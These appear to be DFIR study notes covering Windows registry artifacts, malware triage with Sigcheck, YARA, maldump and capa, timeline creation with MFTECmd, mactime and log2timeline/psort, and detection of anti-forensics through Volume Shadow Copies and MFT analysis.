- Verify the PC that is being examined
	
**Time Zone of the Machine**
- System\CurrentControlSet\Control\TimeZoneInformation
- Correlation Activity
- Log Files\TimeStamps

**Network Interfaces**
- SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces
- Static or DHCP
- Ties machines to network activity
- Interface GUID for additional profiling
	
**Historical Networks**
- SOFTWARE\Microsoft\Windows NT\CurrentVersion\NetworkList\Signatures\Managed
- SOFTWARE\Microsoft\Windows NT\CurrentVersion\NetworkList\Signatures\Unmanaged
- SOFTWARE\Microsoft\Windows NT\CurrentVersion\NetworkList\Nla\Cache
- Identify Networks Computer has been connected to
- Could be wired or wireless
- Domain/intranet Name
- Identify SSID
- Identify Gateway MAC Address
- First and Last Time network connection was made
- Networks that have been connected to via VPN
- MAC address of SSID for Gateway can be physically triangulated
- Write Down ProfileGUID

**Network Types**
- SOFTWARE\Microsoft\WZCSVC\Parameters\Interfaces\{GUID} (XP)
- SOFTWARE\Microsoft\Windows NT\CurrentVersion\NetworkList\Profiles (Win7-10)
- ID the type of network that the computer connected to
- ID wireless SSIDs that the computer previously connected to
	- ProfileName
- Time is recorded in LOCAL TIME, NOT UTC
- First and Last Connection Time
	- DateCreated
	- DateLastConnected
- Determine Type using Nametype
	- 6 (0x06) = Wired
	- 23 (0x17) = VPN
	- 71 (0x47) = Wireless
	- 243 (0xF3) = Mobile Broadband
- Network Category
	- Category
	- (Public) 0 - Sharing Disabled
	- (Private) 1 - Home, Sharing Enabled
	- (Domain) 2 - Work, Sharing Enabled
- Geolocate
	- Wigle.net
	
**System AutoStart Programs**
- Programs exhibiting persistence
	- User login
	- Boot time
- NTUSER.DAT\Software\Microsoft\Windows\CurrentVersion\Run
- NTUSER.DAT\Software\Microsoft\Windows\CurrentVersion\RunOnce
- Software\Microsoft\Windows\CurrentVersion\RunOnce
- Software\Microsoft\Windows\CurrentVersion\policies\Explorer\Run
- Software\Microsoft\Windows\CurrentVersion\Run
- (Services) SYSTEM\CurrentControlSet\Services
- IF start set to 0x02, then service application will start at boot (0x00 for drivers)
- Determine programs that start automatically
- Useful for finding malware on a machine that installs on boot such as a rootkit
- Look at when the time key was last updated; generally last boot time of the system
	
**Last Shutdown Time**
- Discover when the system was last shutdown
- How many successful times the system was shutdown
- SYSTEM\CurrentControlSet\Control\Windows (Shutdown Time)
- SYSTEM\CurrentControlSet\Control\Watchdog\Display (Shutdown Count) - XP only
- Detect certain types of activity
- Determine if the user properly shuts down their machine

## Memory Forensics at Scale

* [Get-InjectedThread](https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2)  
* [Kansa Get-InjectedThread.ps1](https://github.com/davehull/Kansa/blob/master/Modules/Process/Get-InjectedThreads.ps1)  
* [MemProcFS Remoting](https://github.com/ufrisk/MemProcFS/wiki/_Remoting)  
* [Velociraptor](https://github.com/Velocidex/velociraptor)  
* [Volexity Volcano](https://www.volexity.com/products-overview/volcano/)

## Scaling Analysis Using IOCs

* [Fast Malware Triage with Openioc_Scan Volatility Plugin](https://takahiroharuyama.github.io/blog/2014/08/15/fast-malware-triage-using-openioc-scan-volatility-plugin/)  
* [Python IOC Editor](https://github.com/YahooArchive/PyIOCe)  
* [OpenIOC Parameters](https://takahiroharuyama.github.io/blog/2014/10/24/openioc-parameters-used-by-openioc-scan/)  
* [Page_brute GitHub](https://github.com/matonis/page_brute)




---



# (4) Timeline Analysis



## Malware Discovery (Field Triage)


### TOOL: Sigcheck

* Microsoft Sysinternals tool designed to validate digital signatures, create file hashes and has Virus Total support. The primary purpose of the tool is to check the code signing characteristics of executable files in a directory.  
* **See FOR508 Lab 4.1 for more practice!**

**NOTE:** to run Sigcheck against triage evidence, you must import the system’s digital signature catalog files located inside of the **CatRoot (catalog root) folder**. 

* Navigate to the triage image CatRoot folder  
  * C:\Windows\System32\CatRoot

* Copy and rename files from triage image to the CatRoot folder on analyst VM  
  * C:\Windows\System32\CatRoot

* Restart Cryptographic Services  
  * Win+R  
  * services.msc  
  * Cryptographic Services > Restart the service


<img src="./files/Restart_Cryptographic_Services.png">


#### Usage

```bash
sigcheck -a -c -e -h -s C:\path\to\file.exe > sigcheck-results.csv
```

```bash
sigcheck -a -c -e -h -s -w C:\path\to\output\file.csv (directory_to_scan)
```


```bash
sigcheck -a -h -v -vt C:\path\to\file.exe
```

- `-a`: Show extended version information including file entropy
- `-c`: CSV output
- `-e`: Scan all files with PE headers (regardless of file extension)
- `-h`: Show file hashes
- `-s`: Recurse subdirectories
- `-u`: Show files that are unknown if VirusTotal check is enabled; otherwise, show only unsigned file
- `-v [rs]`: Query VirusTotal for malware based on file hash. Add 'r' to open reports for files with non-zero detection. Files reported as not previously scanned will be uploaded to VirusTotal if the 's' option is specified
- `-w`: Writes output to a specified file
directory_to_scan: e.g., E:\
- `-vt`: allows Sigcheck to download the trusted Microsoft root certificate list and only output valid certificates ot rooted to a certificate on that list


Sigcheck Analysis via Timeline Explorer  


<img src="./files/Sigcheck_Analysis_Timeline_Explorer.png">



**NOTE:** DO NOT SUBMIT SAMPLE TO VT UNTIL YOU ARE READY FOR THAT INFORMATION TO BE RELEASED

* Sort for **Unsigned** > **High Entropy (6-8)** > **VT Detection**

### TOOL: [YARA](https://yara.readthedocs.io/en/latest/gettingstarted.html)

* IOC tool used to search for string and header-based signatures, standard for IOC sharing, easy to create custom signatures to detect new tools/malware  
* Comprehensive list of YARA rules can be found [here in the yara directory](https://github.com/Neo23x0/signature-base?tab=readme-ov-file).  
* [YARA Command Line Examples](https://yara.readthedocs.io/en/latest/commandline.html)  
* **See FOR508 Lab 4.1 for more practice!**

#### Usage

##### 1. Download [YARA Rules Package](https://yarahq.github.io/)

Select and download preferred package:

* Core: Highest quality, minimal false positives 
* Extended: Additional threat hunting rules 
* Full: Complete operational ruleset

##### 2. Compile Rules

```bash
mkdir compiled_rules
yarac64.exe [YARA-rules-package] ./compiled_rules/yara-forge.compiled
```

##### 3. Scan Targets

**Single File Analysis**

```bash
yara -C compiled_rules/yara-forge.compiled target_file
```

**Directory Analysis**

```bash
yara -C compiled_rules/yara-forge.compiled -r target_directory
```

**Useful Options**

* -C: Load pre-compiled rules 
* -c: Print only the number of matches 
* -f: Fast matching mode 
* -w: Disable warnings 
* -r: Recursively search directories 
* -p <threads>: Use the specified number of threads during scanning




### TOOL: [maldump](https://github.com/NUKIB/maldump)

* Used to find and extract quarantine files from multiple AVs from a live system or mounted disk image, metadata and malware from AV repositories. 
* **See FOR508 Lab 4.1 for more practice!**

**NOTE:** When doing mass collection on endpoints using KAPE, ensure that the KAPE target includes the **quarantine folder** (https://github.com/EricZimmerman/KapeFiles/tree/master/Targets/Antivirus)!

#### Usage

```bash
maldump [optional_args] [mounted_root_dir]
```

* Lists identified quarantined files by default.

```bash
maldump -l [mounted_root_dir]
```

* List identified quarantined files to screen.

```bash
maldump -a [mounted_root_dir]
```

* Dump quarantine files to "quarantine.tar" and metadata to "quarantine.csv".

**Arguments**

* `root_dir`: Root directory where OS is installed (example C:\\).
* `-h`, `--help`: Show this help message and exit.
* `-l`, `--list`: List quarantined file(s) to stdout (default action).
* `-q`, `--quar`: Dump quarantined file(s) to archive 'quarantine.tar'.
* `-m`, `--meta`: Dump metadata to CSV file 'quarantine.csv'.
* `-a`, `--all`: Equivalent of running both `-q` and `-m`.
* `-v`, `--version`: Show program's version number and exit.
* `-d`, `--dest`: Destination for exported files.



### TOOL: [capa](https://github.com/mandiant/capa?tab=readme-ov-file)

* Can detect capabilities in executable files. You run it against a PE, ELF, .NET module, shellcode file, or a sandbox report and it tells you what it thinks the program can do. 
* **See FOR508 Lab 4.1 for more practice!**

#### Usage

```bash
capa.exe -f pe [single_file]
```



## Timeline Analysis Overview

* **ESSENTIALLY**: even if an attacker uses a file wiper to remove the existence of all files, what will the hacker use to remove the wipe the wiper’s presence?

* The three core areas of focus: **filesystem metadata**, **Windows artifacts**, **Windows registry keys**

### Windows Artifacts

Program Execution

* Prefetch  
* ShimCache  
* AmCache  
* UserAssist  
* SRUM

File Opening

* Shortcut Files  
* Jump Lists  
* ShellBags  
* Prefetch  
* OpenSaveMRU

File Knowledge

* WordWheelQuery  
* Last Visited MRU  
* Shortcut Files  
* Recycle Bin  
* Typed Paths

Event Logs

* User Logons  
* RDP Usage  
* RunAs Events  
* Process Tracking  
* PowerShell Logs

Browser Usage:

* History  
* Cookies  
* Cache  
* Session Restore  
* TypedURLs


### Timeline Analytic Process

**1. Determine Timeline Scope**

* What questions do you need to answer?

**2. Narrow Pivot Points**

* Time-based 
* Artifact-based

**3. Determine the Best Process for Timeline Creation**

* **Filesystem-Based Timeline Creation:**
    * FLS or MFTECmd - Fast (Triage Mode)

* **Super Timeline Creation:** Automated or Targeted
    * LOG2TIMELINE

**NOTE:** Super timeline is to be used if you **DO NOT** know what you are looking for. Target super timeline or filesystem timeline is to be used when you **DO** know what you are looking for.

**4. Filter Timeline**

* Using your scope, perform data validation and elimination as needed.

**5. Analyze Timeline**

* Focus on the context of evidence.
* See Windows Forensic Analysis Poster "**Evidence of...**"



### The Pivot Point
- Challenge: Where do I begin to look?
  - Use your scope and case knowledge to help form that answer
  - A timeline has many places where critical activity has occurred
  - Called a timeline pivot point
- Pivot Point: Point used to examine the temporal proximity in the timeline
  - Temporal proximity: What occured immediately before and after a specific event?
- Why a pivot point?
  - Use the pivot point to look before and after in your timeline to get a better idea of what happened on the system
  - Example: Program execution followed by multple writes to C:\Windows\System32 and updating registry entries
  - You can also use the "pivot point" to help identify potential malware by finding suspicious files and finding how they interact with the sytem via the timeline



<img src="./files/Pivot_Points.PNG"/>



### Timeline Capabilities
- Filesystem: `fls or MFTECmd`
  - Filesystem metadata only
  - More filesystem types
    - Apple (HFS)
    - Solaris (UFS)
    - Linux (EXT)
    - Windows (FAT/NTFS)
    - CD-ROM
  - Wider OS/Filesystem capability



- Super Timeline: `log2timeline`  
  - Obtain everything (Kitchen Sink)
  - Filesystem metadata
  - Artifact timestamps
  - Registry timestamps

## Filesystem Timeline Creation and Analysis


### NTFS Timestamps
- **M: Data Content Change Time (Focus)**
  - Time the data content of a file was modified
  - **Last Execution Time**

- A: Data Last Access Time
  - Approximate Time when the file data last accessed

- C: Metadata Change Time
  - Time this MFT record was last modified
  - When a file is renamed, size changes, security permissions update, or if file ownership is changed

- **B: File Creation Time (Focus)**
  - Time file was created in the volume
  - **First Execution Time**


### Windows Time Rules

#### Windows 10 Time Rules
<img alt="Micosoft's Attack Lifecycle" src="./files/Win10_Timeline_Rules.png"/>

#### Windows 11 Time Rules
<img alt="Micosoft's Attack Lifecycle" src="./files/Win11_Timeline_Rules.png"/>


**NOTE:** the Timeline Rules are extracted from the `$Standard_Information` attribute (e.g., the information that is displayed when you **Right-Click > Select Properties** to view file information/metadata) 


**ANALYST NOTE:** **Creation** (a new file appeared) and **modified** (a file was updated) time rules are sufficient to answer most forensic questions. Only use the remaining rules if there are more granular questions that need to be answered.

### Timestamp Rules Exceptions
- Applications
  - Office Products
  - Winzip
  - Updates access times (randomly)
- Anti-Forensics
  - Timestomping
  - Touch
  - Privacy cleaners
- Archives
  - ZIP, RAR, and RGZ
  - Retains original date/timestamps
  - Usually affects modified time only
- Scanning
  - Depends on how well the A/V is written

**OVERALL:** timestamp interpretation should always be done in context with any any other actions that can help explain changes.

### Understanding Timestamps - Lateral Movement Analysis

- **Time Paradox:** a file is modified before it is creates, indicative of lateral movement and copying of files from a remote system!

  - **Creation time:** Time of copy (possible time of lateral movement)
  - **Modification time:** maintains the original modification time from the source machine
  - Always use **creation time** as a "Pivot Point" in timeline

### Filesystem Timeline Format
- Columns
  - Time: All entries kwith the same time are grouped
  - macb: Indication of timestamp type
  - File Size
  - Permissions (Unix Only)
  - User and Group (Unix Only)
  - Meta: Metadata address ($MFT record number for NTFS)
  - File Name
    - Deleted files are appended with "deleted"



### Create Triage Timeline Bodyfile Step 1 - MFTECmd.exe

#### TOOL: [MFTECmd.exe](https://github.com/EricZimmerman/MFTECmd)

Used to extract data from the Master File Table (\$MFT) files, filesystem, journals, and other NTFS system files. Will be used to extract data into **timeline (bodyfile)** format.

#### Usage

```bash
MFTECmd.exe -f "E:\C\$MFT --body "G:\timeline" --bodyf [FILE_NAME].body --blf --bdl C:
```
- -f "filename" (\$MFT, \$J, \$BOOT, \$SDS)
- --csv "dir" (directory to save csv, tab separated)
- --csvf name (Dir to save csv)
- --body "dir" (Dir to save CSV)
- --bodyf "name" (File name to save CSV)
- --bdl "name" Drive letter (C, D, etc.) to use with body file
- --blf (When true, use LF vs CRLF for newlines. Default is false)



### Create Triage Timeline Body File Step 1 - fls (optional)

#### TOOL: fls -m

- The fls tool allows use to interact with a forensics image as though it were a normal filesystem
- The fls tool in the Sleuth Kit can be used to collect timeline information from the filename layer
- It take the inode value of a directory, processes the contents, and displays the filenames in the directory (including deleted items)

#### Usage

`fls [options] image [inode]`

* `-d`: Display deleted entries only
* `-r`: Recurse on directories
* `-p`: Display full path when recursing
* `-m`: Display in timeline bodyfile format
* `-s <sec>`: Timeskew of system in seconds

```bash
fls -r -m C: /cases/cdrive/cdrive.E01 > /cases/cdrive/out.bodyfile
```


### Create Triage Image Timeline Step 2 - mactime
- **ESSENTIALLY:** used to take generated bodyfiles and convert into a organized and human-readable timeline
  
- It can be given a date range to restrict itself or it can cover the entire time range

```bash
mactime -z [TIMEZONE] -y -d -b /path/to/[BODY_FILE].body  > timeline.csv
```
**NOTE:** Used to capture entire timeline, no dates  ranges specified.

```bash
mactime -z [TIMEZONE] -y -d -b /path/to/[BODY_FILE].body [yyyy-mm-dd..yyyy-mm-dd]  > timeline.csv
```

**NOTE:** Used to capture specified time range. 

* `-z`: Specify the time zone (UTC is preferred)
* `-y`: Dates are displayed in ISO 8601 format
* `-d`: Comma-delimited format
* `-b`: Bodyfile location (data file)


**Optional Date Range:**

* Format: `yyyy-mm-dd..yyyy-mm-dd`
* Example: `2020-01-01..2020-06-01`


## Super Timelines


### Process
1. log2timeline - Extract timeline
2. psort - Post processing and output
3. pinfo - Display storage metadata



## TOOL: [log2timeline](https://github.com/log2timeline/plaso)

### Usage

```bash
log2timeline.py  --storage-file [STORAGE_FILE] [SOURCE]
```  

**Arguments**

* `--storage-file [STORAGE_FILE]`: Plaso output database file (e.g., `/path/to/out.plaso`)
* `[SOURCE]`: Device, image, or directory of files to be parsed (e.g., `/path/to/image.E01`)
* `--timezone <TZ>`: Define time zone of the system being investigated (not the output). If a forensic image is provided (e.g., E01, raw), the timezone is identified automatically.
* `--timezone list`: List available time zones
* `--help`: List all options with usage descriptions
* [Plaso Documentation](https://plaso.readthedocs.io/en/latest/)



## Target Examples
- Raw Image
```bash
log2timeline.py --storage-file /path-to/out.plaso image.dd
```  

- EWF Image
```bash
log2timeline.py --storage-file /path-to/out.plaso image.E01
```  

- Virtual Disk Image
```bash
log2timeline.py --storage-file /path-to/out.plaso triage.vhdx
```  

- Physical Device (mounted)
```bash
log2timeline.py --storage-file /path-to/out.plaso /dev/sdd
```  

- Volume via Partition Num
```bash
log2timeline.py --partitions 2 --storage-file /path-to/out.plaso /path-to/image.dd
```

- Triage Folder
```bash
log2timeline.py --storage-file /path-to/out.plaso /triage/dir/
```  


## Targeted Super Timeline Creation

### `log2timeline.py` Parser Presets

```bash
log2timeline.py --parsers "win7,!filestat" --storage-file out.plaso <target>
```

**Arguments**
- [Plaso Parsers](https://plaso.readthedocs.io/en/latest/sources/user/Parsers-and-plugins.html)

- `--parsers list`: to get a list of available presets on a given installation of log2timeline


### `log2timeline.py` Filter Files

- Allows for targeted analysis, supports text-based or YAML, regex, wildcards, path recursions and path variables

```bash
log2timeline.py -f [FILTER_FILE.txt] OR [FILTER_FILE.yaml]
```

**Arguments**
  - [Filter Files](https://plaso.readthedocs.io/en/latest/sources/user/Collection-Filters.html)


## Essential Artifact List for Fast Forensics/Triage Extraction

* Memory
* Registry Hives and Backups
* LNK Files
* Jump Lists
* Prefetch
* Event Logs and Windows Logs
* Browser Data (IE, Firefox, Chrome)
* Master File Table ($MFT)
* Log Files and Journal Log
* Pagefile and Hibernation Files

### `log2timeline.py` + KAPE Triage Collection

**OVERALL:** full disk imaging takes a very long time and is not efficient. The more efficient approach is to begin the investigation with the "Essential Artifact List" and then collecect full disk images if further investigations are needed!

1. Collect only the **ESSENTIAL** using [KAPE](https://ericzimmerman.github.io/KapeDocs/#!index.md) for targeted collection
2. Use `log2timeline.py` to develop the initial Triage Timeline Image.

```bash
log2timeline.py --storage-file [OUTPUT.plaso] /artifact_output_directory/
```


### Filtering Super Timelines


#### 1. `pinfo.py`
- Displays contents of Plaso database. Used to validate the plaso database.
- Information stored inside the `out.plaso` storage container
  - Info on when and how the tool was run
  - List of all plugins/parsers used
  - Filter file information (if applicable)
  - Information gathered during the preprocessing stage
  - A count of each artifact parsed
  - Errors and storage container metadata

```bash
pinfo.py -v out.plaso
```  
- -v for "verbose" information



#### 2. `psort.py`

Command line tool used to post-process the Plaso storage database, the tool creates the timeline from a set of extracted data.

##### General Format
```bash
psort.py --output-time-zone 'UTC' -o l2tcsv -w supertimeline.csv out.plaso [FILTER]
```

- `--output-time-zone ZONE`: Converts stored times to specified time zone
- `-o FORMAT`: Chose the output modile (default is "dynamic" minimal CSV)
  - `l2tcsv`:Traditional CSV format used by log2timeline
  - `opensearch`: Sends result into an OpenSerach database
- `-w FILE`: Name of output file to be written
- `FILTER`: Filter arguement (e.g., provide a date range filter) 
`date > datetime('2023-01-01T00:00:00') AND date < datetime('2023-01-27T00:00:00')`

##### Time Slice Format

- Used to investigate a specific pivot in the system and drill down by grabbing a "slice" from that point in time (e.g., 5 mins before or after an event)

```bash
psort.py --slice '2023-08-30T20:00:00' -w slice.csv [out.plaso]
```

- `--slice_size`: can be used to extend the slice range beyond the default 5 mins.


#### METHOD OF ATTACK: Partial Disk Super Timeline Creation

Example incident where you recieve an alert from your IDS and you need to act fast with minimal threat intel. You extract the **"Essential Artifact List for Fast Forensics/Triage Extraction"** from compromised machine and begin the timeline creation:

- Step 1: Parse Triage Image from Web Server
```bash
log2timeline.py --timezone 'EST5EDT' --parsers 'winevtx, winiis' --storage-file out.plaso [/cases/artifact_directory]
``` 

- Step 2: Add full MFT Metadata (Bodyfile for Timeline)
```bash
log2timeline.py --parsers 'mactime' --storage-file out.plaso [/cases/timeline_mftecmd.body]
```  

- Step 3: Filter Timeline
```bash
psort.py --output-time-zone 'UTC' -o l2tcsv -w supertimeline.csv out.plaso "date > datetime('2023-01-01T00:00:00') AND date < datetime('2023-01-27T00:00:00')"
``` 

#### METHOD OF ATTACK: Full Disk Super Timeline Creation

- Step 1: Parse Triage Image from Web Server
```bash
log2timeline.py --timezone 'EST5EDT' -f filter_windows.yaml --parsers 'win7,!filestat' --storage-file out.plaso [/cases/cdrive/YOUR_DISK.E01]
``` 

- Step 2: Add full MFT Metadata (Bodyfile for Timeline)
```bash
log2timeline.py --parsers 'mactime' --storage-file out.plaso [/cases/mftecmd.body]
```
Adding the mactime parser based on your the file system data from `mftecmd.body`  

- Step 3: Filter Timeline
```bash
psort.py --output-time-zone 'UTC' -o l2tcsv -w supertimeline.csv out.plaso "date > datetime('2023-01-01T00:00:00') AND date < datetime('2023-01-27T00:00:00')"
```



### Timeline Analysis Tips and Tricks


#### Timeline Analysis Process


**NOTE:** SECTION NEEDS TO BE UPDATED (SEE LAB 4.3 A/B)

* **Determine Timeline Scope:** What questions do you need to answer?

* **Narrow Pivot Points:**
  * Time-based
  * Artifact-based

* **Determine the Best Process for Timeline Creation:**
  * Filesystem-Based Timeline Creation - FLS or MFTECmd - FAST (TRIAGE MODE)
  * Super Timeline Creation - Automated or Targeted - LOG2TIMELINE

* **Filter Timeline**

* **Analyze Timeline:**
  * Focus on the context of evidence
  * Use Windows Forensic Analysis Poster "Evidence of..."


#### Timeline Explorer Hot Keys


- CTRL-E: Clear filters
- CTRL-T: Tag or untag selected rows
- CTRL-R: Reset column widths
- CTRL-D: Bring up details (for use with supertimelines)
- CTRL-C: Copy selected cells (and headers) to clipboard
- CTRL-F: Show Find dialog
- CTRL-Down: Select Last Row
- CTRL-Shift-A: Select all values in current column
- Wildcards are supported in column filters


#### Timeline Explorer Shortcuts 

- `Search options` (bottom right-hand side of screen allows you to pin specific columns)

- Ideal column setup:
  - `Timestamp`, `Source Description`, `macb`, `Short Description`, `Long Description` 

- When conducting analysis, focus on the **Bodyfile** (the Master File Table) + **Specific Timestamp (macb)** to identify the last modified time


#### Most Essential Super Timeine Columns


* **date:** Date of the event, in the format of MM/DD/YYYY
* **time:** Time of day, expressed in a 24h format, HH:MM:SS
* **MACB:** MACB timestamps, typically only relevant for filesystem artifacts (files and directories)
* **sourcetype:** More comprehensive description of the source
* **type:** type of an artifact timestamp, e.g., Creation Time for files or Last Time Visited for website history
* **short:** short description of the entry
* **desc:** Long description field; this is where most of the information is stored
* **filename:** Filename with the full path of the artifact which was parsed
* **inode:** Meta-data address of file being parsed
* **extra:** Additional information parsed from the artifact is included here


#### Timeline Explorer Color Legend

- [Colorized Super Timeline Template for Log2timeline Output Files](https://www.sans.org/blog/digital-forensic-sifting-colorized-super-timeline-template-for-log2timeline-output-files/)

- Also see `Help > Legend` for color codes

| Category        | Color       |
|-----------------|-------------|
| **FILE OPENING**    | Light Green |
| **WEB HISTORY**     | Orange      |
| **DELETED DATA**    | Black       |
| **EXECUTION**       | Red         |
| **USB USAGE**       | Blue        |
| **FOLDER OPENING**  | Dark Green  |

**NOTE:** Automatically colorized in Timeline Explorer



### Triage Timeline Creation


#### 0. KAPE Artifact Extraction
- Place all collected artifacts into local directory (e.g., "G:\timeline")



#### 1. Creating Bodyfile

```bash
MFTECmd.exe -f "E:\C\$MFT --body "G:\timeline" --bodyf [FILE_NAME].body --blf --bdl C:
```
- -f "filename" (\$MFT, \$J, \$BOOT, \$SDS)
- --csv "dir" (directory to save csv, tab separated)
- --csvf name (Dir to save csv)
- --body "dir" (Dir to save CSV)
- --bodyf "name" (File name to save CSV)
- --bdl "name" Drive letter (C, D, etc.) to use with body file
- --blf (When true, use LF vs CRLF for newlines. Default is false)


#### 2. Enrich Bodyfile with mactime and convert into .csv
   
```bash
mactime -z [TIMEZONE] -y -d -b /path/to/[BODY_FILE].body  > timeline.csv
```
**NOTE:** Used to capture entire timeline, no dates  ranges specified.

```bash
mactime -z [TIMEZONE] -y -d -b /path/to/[BODY_FILE].body [yyyy-mm-dd..yyyy-mm-dd]  > timeline.csv
```

**NOTE:** Used to capture specified time range. 

* `-b`: Bodyfile location (data file)
* `-y`: Dates are displayed in ISO 8601 format
* `-z`: Specify the time zone (UTC is preferred)
* `-d`: Comma-delimited format

**Optional Date Range:**

* Format: `yyyy-mm-dd..yyyy-mm-dd`
* Example: `2020-01-01..2020-06-01`


#### 3. Tune out unnecessary noise
```bash
grep -v -i -f timeline_noise.txt timeline.csv > timeline-final.csv
```  

---


### Super Timeline Creation - Partial Disk Analysis



#### 1. List Timezones
```bash
log2timeline.py -z list
```



#### 2. Timeline Windows artifacts
```bash
log2timeline.py --timezone 'EST5EDT' --parsers 'winevtx, winiis' --storage-file out.plaso [/cases/artifact_directory]
``` 

#### 3. Add Master File Table
```bash
log2timeline.py --parsers 'mactime' --storage-file out.plaso [/cases/timeline_mftecmd.body]
```  

#### 4. Convert Super Timeline to CSV and Filter
```bash
psort.py --output-time-zone 'UTC' -o l2tcsv -w supertimeline.csv out.plaso "date > datetime('2023-01-01T00:00:00') AND date < datetime('2023-01-27T00:00:00')"
``` 



```bash
grep -a -v -i -f timeline_noise.txt supertimeline.csv > supertimeline_final.csv
```  

---


### Super Timeline Creation - Full Disk Analysis



#### 1. List Timezones
```bash
log2timeline.py -z list
```

#### 2. Parse Full Triage Image
```bash
log2timeline.py --timezone 'EST5EDT' -f filter_windows.yaml --parsers 'win7,!filestat' --storage-file out.plaso [/cases/cdrive/YOUR_DISK.E01]
``` 


#### 3. Add full MFT Metadata (Bodyfile for Timeline)
```bash
log2timeline.py --parsers 'mactime' --storage-file out.plaso [/cases/mftecmd.body]
```
Adding the mactime parser based on your the file system data from `mftecmd.body`  

#### 4. Convert Super Timeline to CSV and Filter

```bash
psort.py --output-time-zone 'UTC' -o l2tcsv -w supertimeline.csv out.plaso "date > datetime('2023-01-01T00:00:00') AND date < datetime('2023-01-27T00:00:00')"
``` 

```bash
grep -a -v -i -f timeline_noise.txt supertimeline.csv > supertimeline_final.csv
``` 


## Scaling Timeline Analysis


### [Timesketch](https://github.com/google/timesketch)

- An open-source tool for collaborative forensic timeline analysis. Using sketches you and your collaborators can easily organize your timelines and analyze them all at the same time. Add meaning to your raw data with rich annotations, comments, tags and stars.



### [yara_match.py](https://github.com/kiddinn/l2t-tools/blob/master/plugins/yara_match.py)

- Plugin embeddded within the `log2timeline.py` parser/tool that loads up a YARA rule file and runs it against each line in the CSV file and if there is a match it will fire up an alert. Used to facilitate searching a super timeline for a list of YARA signature matches.


## Supertimeline Analytic Process


### Sanity Check Questions - REVIEW AND UPDATE


- When were suspicous directories created?
- What is the MFT-Entry value (from the "Meta" column)?
- What is the last modification time for the folder?
  - The last modification time of a folder represents a change in the contents of the directory
- When were suspicious files created?
- Find the prefetch of suspicious executables
- Dowloaded or Transfered Files?
  - Downloaded Indicator: zone.identifier
- Identify when users logged in for the first time
  - Creation of a user profile folder generally marks the first interactive logon session of that user on a system
- LNK files provide evidence of file and folder opening
  - Review the LNK files present in the ```C:/Users/<user>/AppData/Roaming/Microsoft/Windows/Recent``` directory



### Filtering Tips and Tricks - REVIEW AND UPDATE


- Be sure to search context **before** and **after** the highlighted event within Timeline Explorer

- Filter for "AppCompatCache Registry Entry" in the "Source Description" column
  - Adding the "Type" column can help with interpretation of the timestamps

- Use the Power Filter to find all rows with the value "/filename"
  - Click Line showing the creation of indicator
  - Clear your Power Filter ("X"), allowing you to see all of the activity around the creation of that suspicious file

- Select "Registry Key: RDP Connection", and examine the output
  - Notice that the "File Name" column identifies this data as coming from the NTUSER.DAT registry file

- Search for "Recycle" in your Power Filter
  - What user RID (the last 3-4 digits of the SID) is responsible for all of the Recycle Bin activity

- Filter for "Registry Key: BagMRU" (Folder Opening)

- GUI program execution using a filter for the artifact "Registry Key: UserAssist"




---



# (5) Anti-Forensics Detection

**NOTE:** reserved for only a handful of machines as this process is **very time intensive/exhaustive**



## Overview



### Filesystem
- Timestomping
- File Deletion
- File/Free Space Wiping
- Data Encryption (.rar files)
- Fileless Malware



### Registry
- Registry Key/Value Deletion
- Registry Key/Value Wiping
- Hiding Scripts in Registry



### Other
- Event Log Deletion/Tampering
- Process Evasion - Rootkits and Code Injection



## Recovery of Deleted Files via VSS

### Volume Shadow Copies
- Can provide backups of nearly the entire volume to earlier points in time
- Recover key files (event logs, registry, malware, wipe files)
- Introduction of "ScopeSnapshots" in Windows 8+ limits effectiveness (excludes user profiles)
  - Disable by setting ```HKLM\Software\Microsoft\WindowsNT\CurrentVersion\SystemRestore``` to 0



### Volume Shadow Examination
- Triage Analysis
  - KAPE
  - Velociraptor
- Full-Volume Analysis
  - Arsenal Image Mounter
  - F-Response
  - vshadowmount
- Analysis on SIFT VM
  - vshadowinfo
  - vshadowmount

```bash
vshadowinfo /path-to/shadow-copy
```

**NOTE:** cannot be a E01 image
- Used to list out each volume snapshot and the date/time it was created on the source system


### Mount and Serach All Shadow Copies

**Step 1: Mount disk image**

```bash
ewfmount rd01-cdrive.E01 /mnt/ewf_mount/
```

**Step 2: Expose volume snapshots**

```bash
vshadowmount /mnt/ewf_mount/ewf1 /mnt/vss/
```

**Step 3: Mount all snapshots as logical file systems via a FOR loop**

```bash
cd /mnt/vss
```

```bash
for i in vss*; do mount -o ro,show_sys_files,streams_interface=windows $i /mnt/shadow_mount/$i; done
```

**Step 4: Search mounted snapshots**

```bash
cd /mnt/shadow_mount
```

```bash
find . | grep -i <filename>
```


### VSS Examination with `log2timeline.py`

```bash
log2timeline.py --storage-file plaso.dump [DISK.img]
``` 

- If `log2timeline.py` identifies a shadow copy, the tool will inform you of its prescence! 



### VSS Super Timeline Creation (SEE LAB 5.1/5.2)
**NOTE:** Will take several for the extraction and mounting to complete



## Advanced NTFS Filesystem Tactics

### Master File Table - MFT
- Metdata layer contains data that describes files
- Containers point to:
  - Data layer for file content
  - MAC times
  - Permissions
- Each metadata structure is given a numeric address



### MFT Entry Allocated
- Metadata filled out (name, timestamps, permissions, etc.)
- Pointers to clusters containing file contents (or the data itself, if the file is resident)



### MFT Entry Unallocated
- Metadata may or may not be filled out
- If filled out, it is from a deleted file (or folder)
- The clusters pointed to may or may not still contain the deleted file's data
  - The clusters may have been resused

**NOTE:** a sophisticated adversary may flip this bit in order to remove specific metadata about a file.



### Sequential MFT Entries (Lethal DFIR Technique 🎯)
- As files are created, regardless of their directories, MFT allocation patterns are generally sequential and not random


<img src="./files/Sequential_MFT_Entries.png">


**ANALYST NOTE:** Look for "clustering" in the Meta column of MFT entries.  Use analysis of contiguous metadata values to find files likely created in quick succession, even across different directories



### Most Common MFT Entry Attributes within NTFS



#### Attribute Types: FILES

| Type | Name                 |
|------|----------------------|
| **0x10** | `$STANDARD_INFORMATION` |
| 0x20 | `$ATTRIBUTE_LIST`   |
| **0x30** | `$FILE_NAME`        |
| 0x40 | `$OBJECT_ID`        |
| 0x50 | `$SECURITY_DESCRIPTOR`|
| 0x60 | `$VOLUME_NAME`      |
| 0x70 | `$VOLUME_INFORMATION`|
| **0x80** | `$DATA`              |




#### Attribute Types: DIRECTORIES

| Type  | Name                 |
|-------|----------------------|
| **0x90**  | `$INDEX_ROOT`        |
| **0xA0**  | `$INDEX_ALLOCATION`  |
| 0xB0  | `$BITMAP`            |
| 0xC0  | `$REPARSE_POINT`    |
